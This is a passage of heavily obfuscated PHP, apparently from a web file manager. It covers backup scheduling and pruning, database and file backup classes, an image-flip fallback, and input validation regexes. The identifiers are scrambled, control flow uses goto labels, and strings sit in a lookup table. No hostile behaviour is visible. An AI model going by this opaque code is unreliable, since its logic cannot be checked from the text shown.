(!($Aêˆ¶ñ½÷à = Model($Aá©áÍˆ³‘[687])->lastItem())) { $Aêˆ¶ñ½÷à = $this->initData(); } else { self::$name = $Aêˆ¶ñ½÷à[$Aá©áÍˆ³‘[38]]; if ($Aêˆ¶ñ½÷à[$Aá©áÍˆ³‘[688]] == $Aá©áÍˆ³‘[93]) { self::$name = date($Aá©áÍˆ³‘[689]); $båÎˆ©™¾› = 0; if (isset($Aêˆ¶ñ½÷à[$Aá©áÍˆ³‘[290]][$Aá©áÍˆ³‘[177]][$Aá©áÍˆ³‘[427]])) { $båÎˆ©™¾› = (int) $Aêˆ¶ñ½÷à[$Aá©áÍˆ³‘[290]][$Aá©áÍˆ³‘[177]][$Aá©áÍˆ³‘[427]]; } if ($Aêˆ¶ñ½÷à[$Aá©áÍˆ³‘[38]] == self::$name) { Model($Aá©áÍˆ³‘[687])->remove($Aêˆ¶ñ½÷à[$Aá©áÍˆ³‘[375]]); } $Aêˆ¶ñ½÷à = $this->initData($båÎˆ©™¾›, $Aêˆ¶ñ½÷à[$Aá©áÍˆ³‘[690]]); } else { $this->checkStore($Aêˆ¶ñ½÷à[$Aá©áÍˆ³‘[690]]); } } self::$option = $Aêˆ¶ñ½÷à; } private function initData($BÍ¥ŸÊ¡® = 0, $fÉøùÖ‡÷» = '') { goto c÷Òö†”å; c÷Òö†”å: $AŠŠÍ÷ßÕ =& $_SERVER[©]; $a¡àèœ³Û = Model($AŠŠÍ÷ßÕ[687])->config(); if ($fÉøùÖ‡÷» && $a¡àèœ³Û[$AŠŠÍ÷ßÕ[690]] != $fÉøùÖ‡÷») { $BÍ¥ŸÊ¡® = 0; } goto AÄÅ ç¬í³; AÄÅ ç¬í³: $this->checkStore($a¡àèœ³Û[$AŠŠÍ÷ßÕ[690]]); $E‘éˆˆ„ÔÑ = array($AŠŠÍ÷ßÕ[690] => $a¡àèœ³Û[$AŠŠÍ÷ßÕ[690]], $AŠŠÍ÷ßÕ[38] => self::$name, $AŠŠÍ÷ßÕ[688] => 0, $AŠŠÍ÷ßÕ[691] => $a¡àèœ³Û[$AŠŠÍ÷ßÕ[691]], $AŠŠÍ÷ßÕ[290] => array($AŠŠÍ÷ßÕ[692] => array($AŠŠÍ÷ßÕ[688] => 0), $AŠŠÍ÷ßÕ[693] => array($AŠŠÍ÷ßÕ[688] => 0, $AŠŠÍ÷ßÕ[694] => 0, $AŠŠÍ÷ßÕ[695] => 0, $AŠŠÍ÷ßÕ[39] => $AŠŠÍ÷ßÕ[43]), $AŠŠÍ÷ßÕ[696] => array($AŠŠÍ÷ßÕ[688] => 0, $AŠŠÍ÷ßÕ[694] => 0, $AŠŠÍ÷ßÕ[695] => 0), $AŠŠÍ÷ßÕ[177] => array($AŠŠÍ÷ßÕ[688] => 0, $AŠŠÍ÷ßÕ[697] => 0, $AŠŠÍ÷ßÕ[698] => 0, $AŠŠÍ÷ßÕ[699] => 0, $AŠŠÍ÷ßÕ[700] => 0, $AŠŠÍ÷ßÕ[427] => $BÍ¥ŸÊ¡®)), $AŠŠÍ÷ßÕ[701] => time(), $AŠŠÍ÷ßÕ[702] => 0); $B¬†êÈª”² = Model($AŠŠÍ÷ßÕ[687])->insert($E‘éˆˆ„ÔÑ); goto D ÇÂÓÀª; D ÇÂÓÀª: $E‘éˆˆ„ÔÑ[$AŠŠÍ÷ßÕ[375]] = $B¬†êÈª”²; return $E‘éˆˆ„ÔÑ; goto d…‡¨ŠŠ; d…‡¨ŠŠ: } private function checkStore($f§‘Š´Ä…½) { $Fè›…ñ¡‚ =& $_SERVER[©]; $bæ©‰˜šÄÉ = Model($Fè›…ñ¡‚[703])->listData($f§‘Š´Ä…½); Model($Fè›…ñ¡‚[703])->checkConfig($bæ©‰˜šÄÉ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[©][687])->findByName(self::$name); } return self::$option; } public static function set($BÙßÅ­äÑ) { $eèØªø¨§‚ =& $_SERVER[©]; $ağ¢‰¸æëß = self::get(); foreach ($BÙßÅ­äÑ as $CÍŠÂãòÀÑ => $EÃæğÎÚîğ) { $D¥Ø×Öíëä = explode($eèØªø¨§‚[101], $CÍŠÂãòÀÑ); $Bì‰î‰ê…¯ = count($D¥Ø×Öíëä); switch ($Bì‰î‰ê…¯) { case 1: $ağ¢‰¸æëß[$D¥Ø×Öíëä[0]] = $EÃæğÎÚîğ; break; case 2: $ağ¢‰¸æëß[$D¥Ø×Öíëä[0]][$D¥Ø×Öíëä[1]] = $EÃæğÎÚîğ; break; case 3: $ağ¢‰¸æëß[$D¥Ø×Öíëä[0]][$D¥Ø×Öíëä[1]][$D¥Ø×Öíëä[2]] = $EÃæğÎÚîğ; break; } } Model($eèØªø¨§‚[687])->update($ağ¢‰¸æëß[$eèØªø¨§‚[375]], $ağ¢‰¸æëß); self::$option = $ağ¢‰¸æëß; return self::$option; } public function keep() { $d«‹ù£•¿Ô =& $_SERVER[©]; $f¸‰»¤Éğ’ = self::get(); if ($f¸‰»¤Éğ’[$d«‹ù£•¿Ô[290]][$d«‹ù£•¿Ô[692]][$d«‹ù£•¿Ô[688]] == $d«‹ù£•¿Ô[93]) { return; } $this->backupKeep($f¸‰»¤Éğ’); self::set(array($d«‹ù£•¿Ô[704] => 1)); } private function backupKeep($a™©ÖÑî–) { goto BÒƒØóäĞñ; f»œ§ áâ·: $eëÙ÷È«Â¾ = 0; $FŒ…Ò¾‰²£ = array(); foreach ($eî…Â…ñòº as $B¬¶ïÀ……ö) { if ($eëÙ÷È«Â¾ >= 7) { break; } $FŒ…Ò¾‰²£[] = $B¬¶ïÀ……ö[$EØÛÄÒ‰Š£[38]]; $eëÙ÷È«Â¾++; } goto aÛÆŒ¾ƒÖä; aÛÆŒ¾ƒÖä: for ($eëÙ÷È«Â¾ = 0; $eëÙ÷È«Â¾ < 12; $eëÙ÷È«Â¾++) { $FŒ…Ò¾‰²£[] = date($EØÛÄÒ‰Š£[705], strtotime("\x2d{$eëÙ÷È«Â¾}\40\x6d\157\x6e\164\x68\163")); } $FŒ…Ò¾‰²£ = array_unique($FŒ…Ò¾‰²£); foreach ($eî…Â…ñòº as $B¬¶ïÀ……ö) { if (!empty($B¬¶ïÀ……ö[$EØÛÄÒ‰Š£[38]]) && in_array($B¬¶ïÀ……ö[$EØÛÄÒ‰Š£[38]], $FŒ…Ò¾‰²£)) { continue; } Model($EØÛÄÒ‰Š£[687])->remove($B¬¶ïÀ……ö[$EØÛÄÒ‰Š£[375]]); $f¨õæ”¼É¤ = "\173\x69\157\72{$a™©ÖÑî–[$EØÛÄÒ‰Š£[690]]}\175\57\x64\141\164\141\x62\x61\163\x65\57\142\141\x63\153\165\160\x5f{$B¬¶ïÀ……ö[$EØÛÄÒ‰Š£[38]]}"; IO::remove($f¨õæ”¼É¤, !1); } goto d±šÎ²ßÚÍ; BÒƒØóäĞñ: $EØÛÄÒ‰Š£ =& $_SERVER[©]; $eî…Â…ñòº = Model($EØÛÄÒ‰Š£[687])->listData(); if (empty($eî…Â…ñòº)) { return; } goto f»œ§ áâ·; d±šÎ²ßÚÍ: } public function db() { goto F«¬Ò¹ºÜ«; dˆ¡Ş°÷Âˆ: return !0; goto Fšğ¿´µò÷; F«¬Ò¹ºÜ«: $A¨¹ÆÈãËë =& $_SERVER[©]; $D„ëøÎÌ„ê = self::get(); if ($D„ëøÎÌ„ê[$A¨¹ÆÈãËë[290]][$A¨¹ÆÈãËë[693]][$A¨¹ÆÈãËë[688]] == $A¨¹ÆÈãËë[93]) { return !0; } goto eˆËÉô·ÂÅ; eˆËÉô·ÂÅ: $AØ‘¹†ŒÁ = new BackupDb(); if (!$AØ‘¹†ŒÁ->index()) { return !1; } self::set(array($A¨¹ÆÈãËë[706] => 1)); goto dˆ¡Ş°÷Âˆ; Fšğ¿´µò÷: } public function dbFile() { goto E¶•¨ƒ¿¾Í; E¶•¨ƒ¿¾Í: $eæò´Î‘Ÿ‡ =& $_SERVER[©]; $A²ğ–©‚îØ = self::get(); if ($A²ğ–©‚îØ[$eæò´Î‘Ÿ‡[290]][$eæò´Î‘Ÿ‡[696]][$eæò´Î‘Ÿ‡[688]] == $eæò´Î‘Ÿ‡[93]) { return !0; } goto c”„„©÷Ë; Dƒ®‘Õ­ç¥: return !0; goto aªÏ•óÉ­—; c”„„©÷Ë: $A„©ó¶§â = new BackupDbFile(); if (!$A„©ó¶§â->index()) { return !1; } self::set(array($eæò´Î‘Ÿ‡[707] => 1)); goto Dƒ®‘Õ­ç¥; aªÏ•óÉ­—: } public function file() { $Fìï´ºŠ¤ =& $_SERVER[©]; $Aõğ¬®¦¼ = self::get(); if ($Aõğ¬®¦¼[$Fìï´ºŠ¤[290]][$Fìï´ºŠ¤[177]][$Fìï´ºŠ¤[688]] == $Fìï´ºŠ¤[93]) { return !0; } if (!isset($Aõğ¬®¦¼[$Fìï´ºŠ¤[691]]) || $Aõğ¬®¦¼[$Fìï´ºŠ¤[691]] == $Fìï´ºŠ¤[476]) { $A¦×µÄÓÓ‡ = new BackupFile(); if (!$A¦×µÄÓÓ‡->index()) { return !1; } } self::set(array($Fìï´ºŠ¤[708] => 1, $Fìï´ºŠ¤[688] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto E‹“Œ½ŠŸ; DâÉ–´÷–Ò: foreach ($Cœµ©ëğ–— as $eœÚõğÃÉñ) { $cÊîË‚Š®Ï = $A×‹µ’İ³Ú . $eœÚõğÃÉñ . $C‘¢Å÷éƒ[717]; $C¸—¡”Š¤ = null; if ($eœÚõğÃÉñ == $C‘¢Å÷éƒ[718] && (!isset($d˜å£ø¥—î[$C‘¢Å÷éƒ[691]]) || $d˜å£ø¥—î[$C‘¢Å÷éƒ[691]] == $C‘¢Å÷éƒ[476])) { $C¸—¡”Š¤ = self::$io; } $f¢¯”ÀòÀ¼ += $dè·ÒŞ‚ã->sqlFromDb($eœÚõğÃÉñ, $cÊîË‚Š®Ï, $fÍäËºßİº, $C¸—¡”Š¤); } $fÍäËºßİº->end(); $Fëƒ¨‹Ó¿µ = array($C‘¢Å÷éƒ[719] => $AƒÄÆÛİ†, $C‘¢Å÷éƒ[706] => 1, $C‘¢Å÷éƒ[720] => $f¢¯”ÀòÀ¼, $C‘¢Å÷éƒ[721] => $f¢¯”ÀòÀ¼); goto E×ìÕ°”¿; D¡£—‘ˆäİ: $dè·ÒŞ‚ã = new DbManage($aÏ †ªÊ–±, $AƒÄÆÛİ†); $A×‹µ’İ³Ú = TEMP_FILES . $C‘¢Å÷éƒ[709] . self::$name . $C‘¢Å÷éƒ[18]; del_dir($A×‹µ’İ³Ú); goto D™íİ›õˆ; b£Ù©î”¸ç: $Cœµ©ëğ–— = array_diff($Cœµ©ëğ–—, array($C‘¢Å÷éƒ[710], $C‘¢Å÷éƒ[711])); foreach ($Cœµ©ëğ–— as $eœÚõğÃÉñ) { $B¿‘àâÄ‡  += $dè·ÒŞ‚ã->model($eœÚõğÃÉñ)->count(); } $fÍäËºßİº = new Task($C‘¢Å÷éƒ[712], $C‘¢Å÷éƒ[713], $B¿‘àâÄ‡ , LNG($C‘¢Å÷éƒ[714]) . $C‘¢Å÷éƒ[715] . LNG($C‘¢Å÷éƒ[716])); goto DâÉ–´÷–Ò; dÜÃõç‰ğ•: self::$name = $d˜å£ø¥—î[$C‘¢Å÷éƒ[38]]; $aÏ †ªÊ–± = $GLOBALS[$C‘¢Å÷éƒ[16]][$C‘¢Å÷éƒ[27]]; $AƒÄÆÛİ† = $this->_dbType($aÏ †ªÊ–±); goto D¡£—‘ˆäİ; D™íİ›õˆ: mk_dir($A×‹µ’İ³Ú); $B¿‘àâÄ‡  = $f¢¯”ÀòÀ¼ = 0; $Cœµ©ëğ–— = $dè·ÒŞ‚ã->db()->getTables(); goto b£Ù©î”¸ç; E×ìÕ°”¿: Backup::set($Fëƒ¨‹Ó¿µ); return !0; goto AÀ®ğ»ÂäÖ; E‹“Œ½ŠŸ: $C‘¢Å÷éƒ =& $_SERVER[©]; $d˜å£ø¥—î = Backup::get(); self::$io = $d˜å£ø¥—î[$C‘¢Å÷éƒ[690]]; goto dÜÃõç‰ğ•; AÀ®ğ»ÂäÖ: } private function _dbType($C–†ïˆ‰°) { goto d¾´“œ°—Å; d¾´“œ°—Å: $BÅëÒõíİ” =& $_SERVER[©]; $C–†ïˆ‰° = array_change_key_case($C–†ïˆ‰°); $Eñ´‘áÆï = $C–†ïˆ‰°[$BÅëÒõíİ”[722]]; goto EÅ“†¿©Ã; EÅ“†¿©Ã: if ($Eñ´‘áÆï == $BÅëÒõíİ”[723]) { $C³®Š¬•Û = explode($BÅëÒõíİ”[14], $C–†ïˆ‰°[$BÅëÒõíİ”[724]]); $Eñ´‘áÆï = $C³®Š¬•Û[0]; } $béğÕœ† = array($BÅëÒõíİ”[725] => $BÅëÒõíİ”[19], $BÅëÒõíİ”[726] => $BÅëÒõíİ”[727]); if (isset($béğÕœ†[$Eñ´‘áÆï])) { $Eñ´‘áÆï = $béğÕœ†[$Eñ´‘áÆï]; } goto CÚ„§°“ô; CÚ„§°“ô: return $Eñ´‘áÆï; goto a×Ú³÷Šô; a×Ú³÷Šô: } } class BackupDbFile { public function __construct() { } public function index() { goto cÊ‘‡•Îİ; EÑ§Ñ†ï†Ú: $c¶á¶—İñ = TEMP_FILES . "\x62\141\x63\153\x75\x70\137{$b¬ô¿«¹º}\57"; $b‰’ÑâìØ = "\x7b\151\157\x3a{$Fğº¦Ø‚‘[$cã«ÄöÁ‚ê[690]]}\175\57\144\141\x74\141\x62\141\163\x65\x2f"; IO::mkdir($b‰’ÑâìØ . "\x62\141\143\153\165\x70\x5f{$b¬ô¿«¹º}\x2f"); goto DÁ–Ş²°´; a‹ŒµÜÒ‡Ó: $f¾¹’õé©÷->end(); Backup::set(array($cã«ÄöÁ‚ê[733] => $A÷Ÿ£›¾¥µ[$cã«ÄöÁ‚ê[87]])); return !0; goto E¸Ûö­–ÏÉ; eÙğÆáé×Ó: $cùìµçã = CONTROLLER_DIR . $cã«ÄöÁ‚ê[732]; IO::copy($A‹¼‡Á§í, $b‰’ÑâìØ . "\142\141\143\x6b\x75\x70\137{$b¬ô¿«¹º}\57"); IO::copy($cùìµçã, $b‰’ÑâìØ . "\x62\x61\143\153\165\x70\137{$b¬ô¿«¹º}\57"); goto a‹ŒµÜÒ‡Ó; cÊ‘‡•Îİ: $cã«ÄöÁ‚ê =& $_SERVER[©]; $Fğº¦Ø‚‘ = Backup::get(); $b¬ô¿«¹º = $Fğº¦Ø‚‘[$cã«ÄöÁ‚ê[38]]; goto EÑ§Ñ†ï†Ú; DÁ–Ş²°´: $f¾¹’õé©÷ = new TaskFileTransfer($cã«ÄöÁ‚ê[728], $cã«ÄöÁ‚ê[713], 0, LNG($cã«ÄöÁ‚ê[714]) . $cã«ÄöÁ‚ê[420] . LNG($cã«ÄöÁ‚ê[716]) . $cã«ÄöÁ‚ê[729]); $f¾¹’õé©÷->addPath($c¶á¶—İñ); $A÷Ÿ£›¾¥µ = IO::infoWithChildren($c¶á¶—İñ); goto a§™ƒÊØš; a§™ƒÊØš: Backup::set(array($cã«ÄöÁ‚ê[730] => $A÷Ÿ£›¾¥µ[$cã«ÄöÁ‚ê[87]])); IO::move($c¶á¶—İñ, $b‰’ÑâìØ); $A‹¼‡Á§í = CONTROLLER_DIR . $cã«ÄöÁ‚ê[731]; goto eÙğÆáé×Ó; E¸Ûö­–ÏÉ: } } goto a¹šÒ„¡õ; Fƒãğò¯ô¡: if (!function_exists($_SERVER[©][1869])) { define($_SERVER[©][1870], 0); define($_SERVER[©][1871], 1); define($_SERVER[©][1872], 2); function imageflip($d¼ÑƒéÉÖ, $A…ŒŒ¯ÄŠ†) { switch ($A…ŒŒ¯ÄŠ†) { case IMG_FLIP_HORIZONTAL: $F”—Ö’Îùè = imagesx($d¼ÑƒéÉÖ) - 1; $eÂ¯—Ø­‚Ş = $F”—Ö’Îùè / 2; $d™îøÃ–ñ = imagesy($d¼ÑƒéÉÖ); $A“ƒÀàøŞÖ = imageistruecolor($d¼ÑƒéÉÖ) ? imagecreatetruecolor(1, $d™îøÃ–ñ) : imagecreate(1, $d™îøÃ–ñ); for ($Bµš¦¥½Ñ¯ = 0; $Bµš¦¥½Ñ¯ < $eÂ¯—Ø­‚Ş; ++$Bµš¦¥½Ñ¯) { imagecopy($A“ƒÀàøŞÖ, $d¼ÑƒéÉÖ, 0, 0, $Bµš¦¥½Ñ¯, 0, 1, $d™îøÃ–ñ); imagecopy($d¼ÑƒéÉÖ, $d¼ÑƒéÉÖ, $Bµš¦¥½Ñ¯, 0, $F”—Ö’Îùè - $Bµš¦¥½Ñ¯, 0, 1, $d™îøÃ–ñ); imagecopy($d¼ÑƒéÉÖ, $A“ƒÀàøŞÖ, $F”—Ö’Îùè - $Bµš¦¥½Ñ¯, 0, 0, 0, 1, $d™îøÃ–ñ); } break; case IMG_FLIP_VERTICAL: $dÔ“ÊÇÔô = imagesx($d¼ÑƒéÉÖ); $D·„ì¤ÛÇñ = imagesy($d¼ÑƒéÉÖ) - 1; $FŞ’ß˜²ºÈ = $D·„ì¤ÛÇñ / 2; $A“ƒÀàøŞÖ = imageistruecolor($d¼ÑƒéÉÖ) ? imagecreatetruecolor($dÔ“ÊÇÔô, 1) : imagecreate($dÔ“ÊÇÔô, 1); for ($d§š˜ëäà = 0; $d§š˜ëäà < $FŞ’ß˜²ºÈ; ++$d§š˜ëäà) { imagecopy($A“ƒÀàøŞÖ, $d¼ÑƒéÉÖ, 0, 0, 0, $d§š˜ëäà, $dÔ“ÊÇÔô, 1); imagecopy($d¼ÑƒéÉÖ, $d¼ÑƒéÉÖ, 0, $d§š˜ëäà, 0, $D·„ì¤ÛÇñ - $d§š˜ëäà, $dÔ“ÊÇÔô, 1); imagecopy($d¼ÑƒéÉÖ, $A“ƒÀàøŞÖ, 0, $D·„ì¤ÛÇñ - $d§š˜ëäà, 0, 0, $dÔ“ÊÇÔô, 1); } break; case IMG_FLIP_BOTH: $dÔ“ÊÇÔô = imagesx($d¼ÑƒéÉÖ); $d™îøÃ–ñ = imagesy($d¼ÑƒéÉÖ); $A“ƒÀàøŞÖ = imagerotate($d¼ÑƒéÉÖ, 180, 0); imagecopy($d¼ÑƒéÉÖ, $A“ƒÀàøŞÖ, 0, 0, 0, 0, $dÔ“ÊÇÔô, $d™îøÃ–ñ); break; default: return; } imagedestroy($A“ƒÀàøŞÖ); } } if (!function_exists($_SERVER[©][1873])) { function imagecreatefrombmp($d”Ôğ›³Ÿ) { return ImageGdBMP::load($d”Ôğ›³Ÿ); } } class Input { public static function getArray($dŠ×…£Ì») { goto FÌ”ĞÕ µñ; FÌ”ĞÕ µñ: $A‹ä”¨•é =& $_SERVER[©]; global $in; $d³™®Ö÷’ = array(); goto eÖµ†‹ä¤; CÚ÷´ùëä¦: if (count($eÊÓİ‰ˆ) > 0) { show_json(implode($A‹ä”¨•é[1878], $eÊÓİ‰ˆ), !1); } return $d³™®Ö÷’; goto bÍè¸ ³ÛÊ; eÖµ†‹ä¤: $eÊÓİ‰ˆ = array(); $C«‰‡¥’Š = LNG($A‹ä”¨•é[1874]); foreach ($dŠ×…£Ì» as $bÏù•ˆöø¥ => $EÚôî¸İ¦‡) { goto a§‚·ô§„; a§‚·ô§„: $d½¡ğãäÃˆ = _get($EÚôî¸İ¦‡, $A‹ä”¨•é[1243], $C«‰‡¥’Š . $A‹ä”¨•é[877] . $bÏù•ˆöø¥); $B·Ğêäîç‚ = $bÏù•ˆöø¥; if (isset($EÚôî¸İ¦‡[$A‹ä”¨•é[1875]]) && $EÚôî¸İ¦‡[$A‹ä”¨•é[1875]]) { $B·Ğêäîç‚ = $EÚôî¸İ¦‡[$A‹ä”¨•é[1875]]; } goto AÂÕ¹ôÌêâ; AÂÕ¹ôÌêâ: if (!array_key_exists($bÏù•ˆöø¥, $in)) { if (array_key_exists($A‹ä”¨•é[1876], $EÚôî¸İ¦‡)) { if (!is_null($EÚôî¸İ¦‡[$A‹ä”¨•é[1876]])) { $d³™®Ö÷’[$B·Ğêäîç‚] = $EÚôî¸İ¦‡[$A‹ä”¨•é[1876]]; } } else { if (isset($EÚôî¸İ¦‡[$A‹ä”¨•é[1877]])) { $eÊÓİ‰ˆ[] = $d½¡ğãäÃˆ; } } continue; } if (isset($EÚôî¸İ¦‡[$A‹ä”¨•é[1877]]) && $EÚôî¸İ¦‡[$A‹ä”¨•é[1877]] == $A‹ä”¨•é[291]) { $eŸí˜Ÿ“‡ = json_decode($in[$bÏù•ˆöø¥], !0); if (is_array($eŸí˜Ÿ“‡)) { $d³™®Ö÷’[$B·Ğêäîç‚] = $eŸí˜Ÿ“‡; } else { if (array_key_exists($A‹ä”¨•é[1876], $EÚôî¸İ¦‡)) { if (!is_null($EÚôî¸İ¦‡[$A‹ä”¨•é[1876]])) { $d³™®Ö÷’[$B·Ğêäîç‚] = $EÚôî¸İ¦‡[$A‹ä”¨•é[1876]]; } } else { $eÊÓİ‰ˆ[] = $d½¡ğãäÃˆ; } } continue; } $bÉš”’ñë = _get($EÚôî¸İ¦‡, $A‹ä”¨•é[1009]); goto cÊÄÛôŞ‚Œ; cÊÄÛôŞ‚Œ: if (isset($EÚôî¸İ¦‡[$A‹ä”¨•é[1877]]) && !self::check($in[$bÏù•ˆöø¥], $EÚôî¸İ¦‡[$A‹ä”¨•é[1877]], $bÉš”’ñë)) { if (array_key_exists($A‹ä”¨•é[1876], $EÚôî¸İ¦‡)) { if (!is_null($EÚôî¸İ¦‡[$A‹ä”¨•é[1876]])) { $d³™®Ö÷’[$B·Ğêäîç‚] = $EÚôî¸İ¦‡[$A‹ä”¨•é[1876]]; } } else { $eÊÓİ‰ˆ[] = $d½¡ğãäÃˆ; } continue; } $d³™®Ö÷’[$B·Ğêäîç‚] = $in[$bÏù•ˆöø¥]; goto DèÇÙöÜ‚; DèÇÙöÜ‚: } goto CÚ÷´ùëä¦; bÍè¸ ³ÛÊ: } public static function reg($fóÀ‚éˆğ = "\x72\145\161\x75\x69\x72\145") { static $bòâ‚ºŞã = array("\162\145\x71\x75\151\x72\x65" => "\x2e\53", "\x6e\165\155\142\145\162" => "\134\144\53", "\150\x65\x78" => "\x5b\x30\x2d\x39\x41\55\x46\x61\x2d\146\135\x2b", "\151\x6e\164" => "\x5b\55\x5c\x2b\x5d\77\134\144\53", "\142\157\157\154" => "\60\x7c\61", "\146\x6c\157\141\164" => "\x5b\55\x5c\x2b\x5d\x3f\x5c\144\53\50\134\56\134\144\53\51\x3f", "\x65\156\x67\x6c\x69\x73\150" => "\133\x41\55\132\141\55\172\40\135\53", "\x63\150\151\156\145\163\145" => "\x5b\x5c\x78\173\64\145\x30\x30\175\55\x5c\x78\173\71\x66\141\65\175\x5d\53", "\150\141\x73\x43\150\151\x6e\x65\163\x65" => "\x2f\50\x5b\134\x78\173\x34\x65\60\60\x7d\55\x5c\x78\173\71\146\x61\x35\175\x5d\53\x29\57\x75", "\x65\x6d\141\x69\154" => "\134\167\x2b\50\x5b\x5c\56\134\x2d\x5d\134\x77\53\x29\x2a\134\x40\x5c\167\53\x28\133\134\x2e\134\x2d\x5d\134\x77\x2b\51\x2a\x5c\x2e\134\x77\x2b", "\x70\x68\x6f\x6e\145" => "\x31\133\x33\55\71\135\134\x64\173\x39\175", "\x74\x65\154\x70\150\157\x6e\x65" => "\x28\134\50\134\144\x7b\x33\x2c\64\x7d\134\x29\x7c\x5c\144\x7b\63\54\64\175\x2d\x7c\134\x73\51\x3f\134\x64\x7b\67\54\x31\64\175", "\x75\162\154" => "\50\x68\x74\x74\160\x7c\x66\164\x70\174\150\x74\164\x70\163\51\72\x5c\x2f\134\57\x5b\x5c\x77\x5c\55\x5f\x5d\53\x28\x5c\x2e\x5b\134\x77\134\x2d\137\135\53\51\53\x28\x5b\134\x77\134\x2d\134\56\x2c\100\77\136\75\45\x26\x3a\134\57\x7e\134\x2b\43\135\52\133\134\167\134\55\x5c\100\77\136\75\45\46\134\57\176\134\x2b\43\135\x29\x3f", "\165\x72\x6c\106\x75\x6c\x6c" => "\x5b\141\x2d\x7a\x41\55\172\135\x2b\x3a\134\57\x5c\x2f\133\x5e\134\x73\x5d\x2a", "\x69\160" => "\x28\x5c\x64\173\61\54\x33\175\134\x2e\x29\173\x33\175\x28\134\x64\173\x31\x2c\63\x7d\x29", "\172\x69\x70" => "\133\x31\x2d\71\135\x5c\x64\x7b\x35\x7d\x28\x3f\41\x5c\x64\x29", "\x69\144\103\141\162\x64" => "\50\134\144\x7b\x31\65\x7d\x29\x7c\x28\134\x64\173\x31\67\x7d\50\134\144\x7c\x58\174\170\x29\x29", "\143\157\154\157\162" => "\43\50\x5b\60\55\x39\x41\x2d\x46\141\55\146\x5d\x7b\x33\175\x7c\133\60\x2d\x39\x41\x2d\106\x61\55\x66\x5d\173\x36\x7d\51", "\164\x69\x6d\145" => "\50\133\x30\x2d\x31\x5d\x5c\144\x7c\x32\133\60\x2d\x34\135\51\x3a\x5b\60\x2d\x35\x5d\x5c\144", "\x64\141\x74\x65" => "\x5c\x64\173\64\x7d\133\55\134\x2f\x5d\77\50\x30\133\61\55\71\x5d\174\61\x5b\x30\x2d\62\x5d\51\133\55\x5c\57\x5d\x3f\x28\133\x30\x2d\62\x5d\x5c\144\174\63\x5b\60\x2d\61\x5d\51", "\144\x61\164\x65\x54\x69\x6d\x65" => "\134\x64\x7b\64\x7d\133\x2d\134\57\135\x3f\x28\60\133\x31\x2d\x39\135\174\61\x5b\60\x2d\x32\135\51\133\55\x5c\x2f\x5d\x3f\x28\133\60\55\x32\135\134\144\174\63\133\60\55\61\x5d\51\134\x73\53\50\133\60\55\61\x5d\x5c\144\174\x32\x5b\x30\55\64\135\x29\x3a\x5b\x30\55\x35\135\134\x64", "\x70\141\163\x73\x77\157\162\144" => "\50\x3f\x3d\x2e\52\x5c\x64\x29\x28\x3f\x3d\56\x2a\133\141\x2d\x7a\x5d\x29\50\x3f\x3d\56\52\133\101\x2d\132\135\x29\56\x7b\70\x2c\x32\60\175", "\153\x65\171" => "\x5b\x41\x2d\x5a\x61\55\x7a\x30\x2d\x39\137\x5c\x2d\134\x2e\135\53", "\x6b\145\x79\106\x75\x6c\154" => "\x5b\x41\55\x5a\141\x2d\x7a\x30\x2d\71\x5f\x5c\55\134\x2e\x5c\x73\54\x5d\53"); if (!$fóÀ‚éˆğ) { return $bòâ‚ºŞã; } return $bòâ‚ºŞã[$fóÀ‚éˆğ]; } public static function check($Aï¼½å¾˜¿, $DÅ×»‘¦®•, $Cß°‰›Êçò = null) { $e‹àÉÛ¬Î =& $_SERVER[©]; switch ($DÅ×»‘¦®•) { case $e‹àÉÛ¬Î[17]: return in_array($Aï¼½å¾˜¿, $Cß°‰›Êçò); break; case $e‹àÉÛ¬Î[1879]: return floatval($Aï¼½å¾˜¿) > $Cß°‰›Êçò; break; case $e‹àÉÛ¬Î[1880]: return floatval($Aï¼½å¾˜¿) < $Cß°‰›Êçò; break; case $e‹àÉÛ¬Î[334]: return strlen($Aï¼½å¾˜¿) >= $Cß°‰›Êçò[0] && strlen($Aï¼½å¾˜¿) <= $Cß°‰›Êçò[1]; break; case $e‹àÉÛ¬Î[334]: if (is_array($Cß°‰›Êçò)) { return strlen($Aï¼½å¾˜¿) >= $Cß°‰›Êçò[0] && strlen($Aï¼½å¾˜¿) <= $Cß°‰›Êçò[1]; break; } else { return strlen($Aï¼½å¾˜¿) == $Cß°‰›Êçò; break; } case $e‹àÉÛ¬Î[330]: return floatval($Aï¼½å¾˜¿) >= $Cß°‰›Êçò[0] && floatval($Aï¼½å¾˜¿) <= $Cß°‰›Êçò[1]; break; } $fÂåø·ŒîÎ = self::reg(!1); $DÅ×»‘¦®• = isset($fÂåø·ŒîÎ[$DÅ×»‘¦®•]) ? $fÂåø·ŒîÎ[$DÅ×»‘¦®•] : $DÅ×»‘¦®•; if (substr($DÅ×»‘¦®•, 0, 1) != $e‹àÉÛ¬Î[18]) { $DÅ×»‘¦®• = $e‹àÉÛ¬Î[1881] . $DÅ×»‘¦®• . $e‹àÉÛ¬Î[1882]; } return preg_match($DÅ×»‘¦®•, $Aï¼½å¾˜¿) === 1; } public static function get($bÙŒœª›§Ê, $A»ñó’¸ƒ = null, $e½Ó»–¬˜Ø = null, $A £½Ãç¹— = null) { goto A²ó÷£Âî¿; Fä¥‚Š¬: if (!is_null($A £½Ãç¹—)) { $c¼çÎšñ¶[$D÷¡ªØ±™Í[1009]] = $A £½Ãç¹—; } if (!is_null($A»ñó’¸ƒ)) { $c¼çÎšñ¶[$D÷¡ªØ±™Í[1877]] = $A»ñó’¸ƒ; } $AÕ¹§„‹ ‡ = Input::getArray(array($bÙŒœª›§Ê => $c¼çÎšñ¶)); goto Dã…ë†İø®; A²ó÷£Âî¿: $D÷¡ªØ±™Í =& $_SERVER[©]; $c¼çÎšñ¶ = array(); if (!is_null($e½Ó»–¬˜Ø)) { $c¼çÎšñ¶[$D÷¡ªØ±™Í[44]] = $e½Ó»–¬˜Ø; } goto Fä¥‚Š¬; Dã…ë†İø®: return $AÕ¹§„‹ ‡[$bÙŒœª›§Ê]; goto aƒ‘£†Á; aƒ‘£†Á: } } goto bîšùˆ¨¦¢; cÖáíîĞ•: class KodIO { const KOD_SOURCE = "\173\163\x6f\x75\162\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\163\x65\x72\122\x65\143\171\143\154\x65\175"; const KOD_USER_FAV = "\173\165\163\x65\x72\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\162\106\151\x6c\145\124\x61\x67\175"; const KOD_USER_FILE_TYPE = 